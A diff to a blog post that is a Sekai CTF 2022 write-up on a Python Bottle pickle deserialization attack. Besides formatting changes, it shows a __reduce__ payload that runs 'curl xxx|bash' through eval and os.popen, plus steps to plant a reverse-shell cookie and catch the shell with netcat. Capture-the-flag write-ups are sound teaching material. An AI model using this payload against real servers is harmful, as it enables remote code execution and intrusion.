@@ -24,7 +24,9 @@ abstract: Write up for a challenge from Sekai CTF 2022
 summary: Deserialization attack with Python Bottle.
 
 tags:
-  - Source Themes
+  - ctf
+  - writeup
+  - web exploitation
 featured: false
 
 links:
@@ -60,8 +62,11 @@ projects: []
 #   Otherwise, set `slides: ""`.
 slides:
 ---
+{{< list_tags >}}
+{{< list_categories >}}
+{{< toc >}}
 
-### Problem statement
+## Problem statement
 ![](problem-statement.png)
 Author hints that flag is executable
 
@@ -134,6 +139,7 @@ If run the code at local change the set_cookie’s session argument to {”name�
 
 The hint said flag is executable, meaning RCE is possible.
 
+## Basic
 Let's have a look at Python Bottle
 
 ### Python Bottle
@@ -158,7 +164,8 @@ get_cookie:
 
 We have controlled the value input through cookie
 
-### Pickle exploit [Ref](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
+### Pickle exploit
+[Ref](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
 Byte-stream created by pickle.dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in. If you are curious how the instructions in this pickle look like, you can use pickletools to create a disassembly: pickletools.dis(pickled)
 
 ```python
@@ -202,8 +209,8 @@ So if any value in the array pass into pickle.dumps is an instance containing `_
 
 So by implement reduce method that `return (eval, ('__import__("os").popen("curl xxx|bash")',))` , we can execute code on the server.
 
-### The exercise step
-#### Generate cookie 
+## The exercise step
+### Generate cookie 
 Add an class definition with `__reduce__` method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.
 
 ```python
@@ -240,10 +247,10 @@ In Attackbox, open netcat listener at port 55555:
 Request to the SekaiCTF with RCE cookie
 ![](run-payload.png)
 
-Netcat listener now receive reverse shell:
+Netcat listener now receive reverse shell :smile: :
 ![](access-flag.png)
 
-### Reference Links
+## Reference Links
 
 Reverse Shell / Bind Shell: 
 
